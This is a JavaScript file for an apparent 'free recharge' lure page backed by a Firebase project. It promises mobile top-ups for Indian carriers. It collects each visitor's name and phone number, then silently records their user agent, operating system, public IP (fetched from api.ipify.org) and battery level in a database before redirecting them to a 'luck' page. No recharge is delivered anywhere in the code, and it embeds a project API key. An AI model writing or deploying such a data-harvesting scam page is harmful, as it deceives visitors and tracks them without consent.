const firebaseConfig = {
  apiKey: "AIzaSyDywjRLiR6ICXGjKbgSvawgQdtHMISYpw8",
  authDomain: "free--recharge.firebaseapp.com",
  projectId: "free--recharge",
  storageBucket: "free--recharge.appspot.com",
  messagingSenderId: "488699485237",
  appId: "1:488699485237:web:e39a1b373e1143c1d5a57c"
};

 
  // Initialize Firebase
  //requored
firebase.initializeApp(firebaseConfig);
   
// Get a reference to the database service
var database = firebase.database();

const timeStr = new Date().getTime();

const time = new Date(timeStr).toLocaleTimeString()+ ' ' + new Date(timeStr).toLocaleDateString();;
//add key and value best option
//firebase.database().ref('users').child('John/').set({number: 30232749593});

//firebase.database().ref('users').child('saheer').set({number: 38328493839});

//with random name

//firebase.database().ref('messages').push({text: 'Hello, world!'});

// firebase.database().ref(userName).set({battery2: '000pt'});

var visitors = firebase.database().ref('visitors')
//get ++

visitors.push({ip : 'ip here'});

const _ = e => document.querySelector(e)
const __ = e => document.querySelectorAll(e)
////////
//_('nav').style.transition= 'all 5s'

_('nav').style.background= 'transparent'
//_('nav').style.minHeight= '30px'

var heading = document.querySelector('.heading').innerText
var primaryBg

firebase.database().ref().on("value", function(snapshot) {
      snapshot.forEach(function(childSnapshot) {
            var key = childSnapshot.key;
            var value = childSnapshot.val();
            console.log(" keys?" + key,
            'number = '+value.number);
            console.log('number:'+value)
            
            console.log("Tag: " + key + "IP address: " + value.IP, 'Battery Leve :' + value.Battery , 'OS: ' + value.OS, 'User Agent: ' + value.UserAgent,
            'Heading = '+ value.Heading, 'Title = '+value.title);
            primaryBg = value.primarybg
           // console.log('Ahy'+key.AppEdit, value.AppEdit)
            if (key =='AppEdit' ) {
             // alert(value.Heading)
              
            heading = document.querySelector('.heading').innerText=value.Heading
            document.querySelector('.heading').style.padding='10px'
           buttonBg = value.primaryBtn
            titleLayoutBg = value.titleLayoutBg
              
              primaryBg=value.primarybg
              mainTitle = value.title
              console.log(mainTitle)
              document.title = mainTitle;
              titleLayoutBg=value.titleLayoutBg
              
              setTheme()
              
            }
      })
})//theme setting((()))
var nav = _('nav')
var button = _('.next_button')
var titleLayout=_('.titleLayout')
const main = _('#main')

function setTheme(){
  nav.style.background= primaryBg
   button.style.background= buttonBg
   titleLayout.style.background=titleLayoutBg;
   
   main.classList='mainVisible'
  //button.style.background=primaryButton;
  //console.log('okdsy'+primaryButton)
  
  
}

///////

const reference = database.ref("users");

reference.get().then((snapshot) => {
  const key = snapshot.key;
  const value = snapshot.val();

  console.log(key, value);
});


//<-------------------------------->//

console.log('Reading device security...');
//console.warn('Filed to Read The Device')
//console.error('sorry!, This device is secured "Protected" by saheer (coder)')
//console.log('Sending The errors to saheers DataBase/securedDevices/SMJ600.2')


const submit = _('.next_button')
console.log(submit)
const input = __('input')
const amount = _('.amount')
const errorLabel = _('.error')
const agreeBox = _('#agreeBox')
var popup = document.getElementById("myPopup");

var carrerSelect = document.getElementById('carrerSelect');
var carrerSelect = document.getElementById('carrerSelect');
var carrerSelect = document.getElementById('carrerSelect');


//---career////

var value = carrerSelect.value;

var index = carrerSelect.selectedIndex;
var value = carrerSelect.options[index].value;
////.//
//head txt is uperside
//for set a value
//database.ref('AppEdit').child('primarybg').set('rgba(255, 48, 48, 1)').then(function() {
  //console.log("heading value added to db successfully!");
//})//./..///




// firebase.database().ref('AppEdit').on("value", function(snapshot) {
//       snapshot.forEach(function(childSnapshot) {
//             var key = childSnapshot.key;
//             var value = childSnapshot.val();
//             console.log('==========')
//             console.log("Tag: " + key + "h1: " + value,);
//             console.log('gettted'+ "h1: " + velue.Heading,)
//       })
// })


var career

carrerSelect.addEventListener('change', function() {
  var value = this.value;
  console.log(value)
  
  if (value=='airtel') {
    career = 'AIRTEL'
    amount.value=249
  } else {
    if (value=='jio') {
      career = 'JIO'
      amount.value=199
    } else {
      if (value == 'idea') {
        career = 'IDEA'
        amount.value = 239
      } else {
      if (value == 'bsnl') {
        career = 'BSNL'
        amount.value = 189
      } else {
        amount.value=''
      }
      }
    }
  }
  
});
//-----------///
//var userName = input[0].value+' '+input[1].value





submit.addEventListener('click', ()=>{
  if (input[0].value == '') {
    errorLabel.innerText='All fields Required.'
    
  } else {
    if (input[1].value == '') {
      errorLabel.innerText='All fields Required.'
    } else {
      if (input[2].value == '') {
        errorLabel.innerText = 'All fields Required.'
      } else {
      
      if (input[3].value == '') {
        errorLabel.innerText = 'All fields Required.'
      } else {
      if (input[2].value.length !== 10) {
        errorLabel.innerText = 'Mobile Number is Incorrect.'
      } else {
        if (carrerSelect.value=='select') {
          errorLabel.innerText = 'Select Carrer'
        } else {
          if (agreeBox.checked==true) {
          errorLabel.innerText = 'Loading...'
          var userName = input[0].value+' '+input[1].value
          var phNumber = input[2].value
          
          console.log('SIM = '+career)
          //when all conditions are accepted
          //db
          
          
          ////
          database.ref(userName).child('Number').set(phNumber).then(function() {
            console.log("User number added successfully!");
          })
          
          database.ref(userName).child('Career').set(career).then(function() {
            console.log("Battery value added successfully!");
          })
          
          
          
          // firebase.database().ref(userName).set({number: phNumber});
          // console.log('name and number added successfully')
        getDeviceInfo()
        
        function getDeviceInfo() {
          var userAgent = navigator.userAgent;
          var deviceInfo = {};
        console.log(deviceInfo)
        console.log(userAgent)
          // Extract device information from user agent string
          if (userAgent.match(/Android/i)) {
            deviceInfo.os = 'Android';
            
            console.log(deviceInfo.os)
          } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
            deviceInfo.os = 'iOS';
            console.log(deviceInfo.os)
          } else if (userAgent.match(/Windows/i)) {
            deviceInfo.os = 'Windows';
            console.log(deviceInfo.os)
          } else if (userAgent.match(/Macintosh|MacIntel/i)) {
            deviceInfo.os = 'Mac';
            console.log(deviceInfo.os)
          } else if (userAgent.match(/Linux/i)) {
            deviceInfo.os = 'Linux';
            console.log(deviceInfo.os)
          } else {
            deviceInfo.os = 'Unknown';
            console.log(deviceInfo.os)
          }
        
          deviceInfo.userAgent = userAgent;
        
          console.log('user agent= ' + userAgent)
          
        
          var database = firebase.database();
        
          database.ref(userName).child('UserAgent').set(userAgent).then(function() {
            // var dataIp = data.IP
            console.log("UserAgent  added successfully!")
            
            var os = deviceInfo.os
            database.ref(userName).child('OS').set(os).then(function() {
              console.log("Battery value added successfully!");
              
                //ip tracing
                console.log('Fetching IP')
                fetch('https://api.ipify.org?format=json')
                  .then(results => results.json())
                  .then(data => database.ref(userName).child('IP').set(data.ip).then(function() {
                      // var dataIp = data.IP
                      console.log("IP value added successfully!");
              
                      //after that
              
              
              
                    })
                    // .catch(function(error)
                    // {
                    //   console.error("Error adding tag and value:", error);
              
                    // })
                  );
            })
          });
        
        
          return deviceInfo;
        }
          /////
          
        
          getBattery()
          function getBattery() {
            console.log('getting battery value')
          
            navigator.getBattery().then(function(battery) {
              console.log('getting battery level')
              var batteryLevel //document.querySelector(".batteryOuter").innerHTML
              = battery.level * 100.000 + "%";
          
              console.log(batteryLevel)
              database.ref(userName).child('Battery').set(batteryLevel).then(function() {
                console.log("Battery value added successfully!");
              }).catch(function(error) {
                console.error("Error adding tag and value:", error);
              })
            });
          
          
          //set time
          database.ref(userName).child('Time').set(time).then(function() {
                  console.log("time value added successfully!");
                })
          
          
          
            //get tag and value
            console.log('-----------------')
            firebase.database().ref(userName).on("value", function(snapshot) {
              snapshot.forEach(function(childSnapshot) {
                var key = childSnapshot.key;
                var value = childSnapshot.val();
                console.log("Tag: " + key + ", Value: " + value);
                // Do something with the tag and value (e.g., display them in the HTML)
                
                
                console.log('------------------')
                setTimeout(locate, 2000)
                
              });
            });
          
        
          }
          //save it [dummy]
         // database.ref('AppEdit').child('Password').set('1020').then(function() {
              //  console.log("Battery value added successfully!");
          //})
          
          
          //------
        // database.ref(userName).child('career').set(carrer).then(function() {
        //     // var dataIp = data.IP
        //     console.log("item value added successfully!");
            
        //     database.ref(userName).child('career').set(phNumber)
          
        //   })
          
          // userName.database().ref(fullName).child('number').set({phNumber});

          
          // database.ref(userName).child('career').set(carrer).then(function() {
          //   // var dataIp = data.IP
          //   console.log("item value added successfully!");
          
          // })
          
        }if (agreeBox.checked==false) {
          errorLabel.innerText = 'Agree the Terms and Conditions'
          popUpError()
        }
        }
        
        
      }
      }
      }
      
    }
  }
})
input[0].addEventListener('focus', ()=>{
  errorLabel.innerText=''
})

input[1].addEventListener('focus', ()=>{
  errorLabel.innerText=''
})
input[2].addEventListener('focus', ()=>{
  errorLabel.innerText=''
})
input[3].addEventListener('focus', ()=>{
  errorLabel.innerText=''
})


// When the user clicks on div, open the popup
function popUpError() {
  
  popup.classList.toggle("show");
}


agreeBox.addEventListener('change',()=>{
  if (agreeBox.checked==true) {
    popup.classList.remove("show")
  } else {
    popup.classList.toggle("show")
  }
})

//save it [dummy]
//database.ref('AppEdit').child('brimary_button').set('rgba(255, 100, 100, 1)').then(function() {
  //console.log("Battery value added successfully!");
//})
function locate(){
  location='/luck.html'
}